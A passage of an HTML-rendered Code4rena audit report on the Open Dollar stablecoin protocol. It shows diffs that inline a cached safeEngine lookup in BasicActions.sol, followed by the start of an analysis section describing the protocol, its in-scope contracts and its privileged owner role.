</span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/actions/BasicActions.sol b/src/contracts/proxies/actions/BasicActions.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e45fd41..8ad98f9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/actions/BasicActions.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/actions/BasicActions.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -98,7 +98,6 @@ contract BasicActions is CommonActions, IBasicActions {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 _deltaWad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -107,7 +106,7 @@ contract BasicActions is CommonActions, IBasicActions {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _manager,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _getGeneratedDeltaDebt(ODSafeManager(_manager).safeEngine(), _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L128-L139\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L128-L139</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeEngine</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:\t</span><span class=\"mtk3\">// Paybacks debt to the SAFE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_getRepaidDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -134,7 +133,7 @@ contract BasicActions is CommonActions, IBasicActions {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Paybacks debt to the SAFE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _modifySAFECollateralization(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _manager, _safeId, 0, _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _manager, _safeId, 0, _getRepaidDeltaDebt(ODSafeManager(_manager).safeEngine(), _safeInfo.collateralType, _safeInfo.safeHandler)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L179-L192\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L179-L192</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeEngine</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Locks token amount into the SAFE and generates debt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_collateralAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">_getGeneratedDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaWad</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -188,7 +187,7 @@ contract BasicActions is CommonActions, IBasicActions {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _manager,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _collateralAmount.toInt(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _getGeneratedDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _getGeneratedDeltaDebt(ODSafeManager(_manager).safeEngine(), _safeInfo.collateralType, _safeInfo.safeHandler, _deltaWad)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L354-L367\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L354-L367</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeEngine</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Paybacks debt to the SAFE and unlocks token amount from it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">363</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:      -</span><span class=\"mtk12\">_collateralWad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">_getRepaidDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">:    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address _safeEngine = ODSafeManager(_manager).safeEngine();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ODSafeManager.SAFEData memory _safeInfo = ODSafeManager(_manager).safeData(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ITaxCollector(_taxCollector).taxSingle(_safeInfo.collateralType);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -363,7 +362,7 @@ contract BasicActions is CommonActions, IBasicActions {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _manager,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       _safeId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       -_collateralWad.toInt(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _getRepaidDeltaDebt(_safeEngine, _safeInfo.collateralType, _safeInfo.safeHandler)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _getRepaidDeltaDebt(ODSafeManager(_manager).safeEngine(), _safeInfo.collateralType, _safeInfo.safeHandler)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/386#issuecomment-1788046606\">pi0neerpat (OpenDollar) confirmed</a></strong></p>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 11 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/330\">report highlighted below</a> by <strong>hunter_w3b</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/230\">fouzantanveer</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/28\">ZanyBonzy</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/418\">clara</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/404\">jauvany</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/351\">SAAJ</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/350\">JCK</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/164\">wei3erHase</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/154\">0xweb3boy</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/66\">Myd</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/65\">0xbrett8571</a>.</em></p>\n<h3 id=\"overview-of-the-open-dollar-audit\" style=\"position:relative;\"><a href=\"#overview-of-the-open-dollar-audit\" aria-label=\"overview of the open dollar audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of the Open Dollar Audit</h3>\n<p>Open Dollar is a DeFi lending protocol designed for liquidity and stability. Users can lock Liquid Staking Tokens (LSTs) and assets into Collateralized Debt Positions (CDPs) through NFT Vaults, allowing them to borrow the $OD stablecoin. Unlike other stablecoins, $OD adjusts its redemption rate based on market volatility, enhancing flexibility and minimizing governance. Open Dollar aims to reduce LST volatility, boost token liquidity, and offers a unique tradable vaults system. It’s a floating $1.00 pegged stablecoin backed by LSTs, primarily for Arbitrum, and employs the GEB framework for CDPs. This protocol enables borrowing against staked assets, earning staking rewards, and liquidity through Non-Fungible Vaults (NFVs).</p>\n<p><strong>The key contracts of Open Dollar protocol for this Audit are</strong>:</p>\n<p>These contracts are central to the functionality, security, and governance of the Open Dollar protocol. Focusing on them first will provide a solid foundation for understanding the protocol’s operation and how it manages user assets and stability.</p>\n<ul>\n<li><strong>ODGovernor.sol</strong>:\nODGovernor contract manages the governance of the protocol, enabling modifications to key parameters. Understanding how governance functions is crucial for ensuring the protocol’s stability and adaptability.</li>\n<li><strong>AccountingEngine.sol</strong>:\nThe AccountingEngine contract handles the surplus, debt, and auctions. It’s essential to comprehend how the protocol manages these aspects as they directly impact the stability and liquidity of the platform.</li>\n<li><strong>Vault721.sol</strong>:\nThis contract serves as the Proxy Registry and Proxy Factory and is responsible for managing safe ownership, transfers, and approvals. Understanding how safes are managed is vital to ensure the security of users’ assets.</li>\n<li><strong>ODProxy.sol</strong>:\nODProxy is critical for ensuring the safe and secure transfer of assets within the protocol. It’s important to understand its functionality and restrictions.</li>\n<li><strong>ODSafeManager.sol</strong>:\nAs it manages safe movement and creation, it’s essential to know how this contract operates, especially in terms of the interaction with Vault721 and safe management.</li>\n</ul>\n<h3 id=\"system-overview\" style=\"position:relative;\"><a href=\"#system-overview\" aria-label=\"system overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>System Overview</h3>\n<h3 id=\"scope-1\" style=\"position:relative;\"><a href=\"#scope-1\" aria-label=\"scope 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h3>\n<ul>\n<li><strong>AccountingEngine.sol</strong>: AccountingEngine contract in the Open Dollar protocol manages the protocol’s surplus and debt. It facilitates surplus and debt auctions, tracks debt queues, and enables settlement. Additionally, it can initiate surplus auctions, transfer surplus to designated receivers, and be disabled to handle post-settlement debt and surplus management.</li>\n<li><strong>CamelotRelayer.sol</strong>: The CamelotRelayer contract in the Open Dollar protocol bridges data from a CamelotRelayer TWAP pool to a standard IBaseOracle format. It converts the price into a 18-decimal format. The contract is initialized with base and quote tokens, symbol, and other parameters. It offers functions to retrieve results from the CamelotRelayer pool, with checks for data validity. This adaptation is vital for integrating price data within the Open Dollar protocol.</li>\n<li><strong>CamelotRelayerFactory.sol</strong>: The CamelotRelayerFactory contract in the Open Dollar protocol deploys CamelotRelayers, which fetch and transform price data. It’s initialized with authorization controls and provides a method to create new CamelotRelayers with specific token pairs and periods. The contract maintains a list of deployed CamelotRelayers, essential for obtaining reliable price data within the Open Dollar system.</li>\n<li><strong>CamelotRelayerChild.sol</strong>: The CamelotRelayerChild contract inherits all the functionality of the “CamelotRelayer” contract and is specifically designed to be deployed by the factory. It serves as a CamelotRelayer within the Open Dollar protocol, providing price data transformation and compatibility features for base and quote tokens with specified quote periods.</li>\n<li><strong>UniV3Relayer.sol</strong>: The UniV3Relayer contract in the Open Dollar protocol fetches and transforms price data from a UniswapV3Pool into a standard IBaseOracle feed. It’s configured with specific base and quote tokens, along with a fee tier and quote period for obtaining reliable price data. The contract ensures that the quote result is expressed in an 18 decimal format, making it compatible with the Open Dollar ecosystem.</li>\n<li><strong>ODGovernor.sol</strong>: The ODGovernor contract in the Open Dollar protocol is a comprehensive governance contract that incorporates various modules and extensions for decentralized decision-making. It manages voting and proposals, configures parameters like voting delay and quorum, and integrates with the Open Dollar token and a timelock contract to ensure secure and effective governance processes.</li>\n<li><strong>ODProxy.sol</strong>: The ODProxy contract is a simple proxy contract designed for use in the Open Dollar protocol. It allows the owner to execute functions on another contract (the target) via delegatecall. The contract enforces that only the owner can invoke these functions. It includes error handling for cases when the target address is required, the target call fails, or the sender is not the owner.</li>\n<li><strong>Vault721.sol</strong>: The Vault721 contract is used in the Open Dollar protocol (Version 1.5.5) to manage tradable Vaults as ERC-721 tokens. It involves governance, initialization, proxy creation, and management. Users can interact with their Vaults and trade ownership of these assets through this contract.</li>\n<li><strong>SAFEHandler.sol</strong>: The SAFEHandler contract is used to create a unique safe handler address for each user’s SAFE within the Open Dollar protocol. It is deployed when a new SAFE is created and grants permissions to the SAFE manager to modify the SAFE associated with this contract’s address.</li>\n<li><strong>ODSafeManager.sol</strong>: The ODSafeManager contract serves as an interface to the SAFEEngine, facilitating the management of SAFEs in the Open Dollar protocol. It provides functions to open, modify, and transfer SAFEs, as well as control access permissions. The contract also interacts with the Vault721 contract for NFT management.</li>\n<li><strong>BasicActions.sol</strong>: The BasicActions contract in the Open Dollar protocol facilitates the management of SAFEs. It allows users to open new SAFEs, generate and repay debt, lock and free token collateral, and manage collateralization ratios. These actions are crucial for maintaining the stability and usability of the protocol’s stablecoin system.</li>\n</ul>\n<h3 id=\"privileged-roles\" style=\"position:relative;\"><a href=\"#privileged-roles\" aria-label=\"privileged roles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Privileged Roles</h3>\n<p>Some privileged roles exercise powers over the Controller contract:</p>\n<ul>\n<li><strong>Owner</strong></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">OWNER</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OnlyOwner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span 